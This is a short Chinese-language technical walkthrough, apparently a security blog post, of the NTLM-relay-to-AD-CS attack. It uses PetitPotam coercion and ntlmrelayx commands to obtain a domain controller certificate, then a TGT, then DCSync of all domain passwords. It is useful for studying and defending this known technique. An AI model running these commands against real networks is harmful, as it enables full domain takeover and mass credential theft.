# NtlmRelayCs  
## 简述  
在大型企业的内网当中通常会内置证书服务器，在这些服务器默认部署的时候会开放NTLM的认证方式。通过证书验证的方式我们可以获取到票据，域控服务器主机的权限是能够DCsync的（回忆zerologon）

在今年的八月微软出了大量的漏洞，可见其中的EFS接口，类似之前的petitpotam    
``` 
certutil 即可查看  
```
## 造成影响  
1、DcSync拿下域控的密码  

## 攻击思路 
攻击思路就出现了  
1. 首先创建一个ntlm-relay服务器，将进行中继的服务选择为域当中的证书服务器 
2. 我们可以通过MS-EFSRPC接口使域控向我们进行进行ntlm认证
3. 当域控的认证消息中继到证书服务器之后，证书服务器就会颁发一个证书给我们 
4. 使用证书向kdc即可获取域控机器账户的TGT票据
5. 通过域控机器账户的TGT票据就可以dcsync从而获取整个域当中的账户密码

## 攻击实践  
下面进行实践我们的攻击步骤

1、首先创建一个ntlm-relay服务，将进行中继的服务选择为域当中的证书服务器 
```
ntlmrelayx.py -t http://cert_ip/certsrv/certfnsh.asp --adcs -debug --templat Domain Controller
```
2、使用Petitpotam的程序进行触发 MS-EFSRPC接口
```
Petitpotam.exe mitm_server dc_ip  
```
![20211030181540](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211030181540.png)
 

3、当域控的认证消息中继到证书服务器之后，证书服务器就会颁发一个证书给我们 
![20211030181712](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211030181712.png)

至此，我们获取到了域控制器机器账户的证书  


4、使用证书向kdc即可获取域控机器账户的TGT票据

![20211030181737](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211030181737.png)

至此获取到TGT的票据  
![20211030181813](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211030181813.png)

5、通过域控机器账户的TGT票据就可以dcsync从而获取整个域当中的账户密码

![20211030181923](https://picsfor.oss-cn-shenzhen.aliyuncs.com/blogs/imgs/20211030181923.png)

## refer  
[Certified specterops.io白皮书 ](https://posts.specterops.io/certified-pre-owned-d95910965cd2)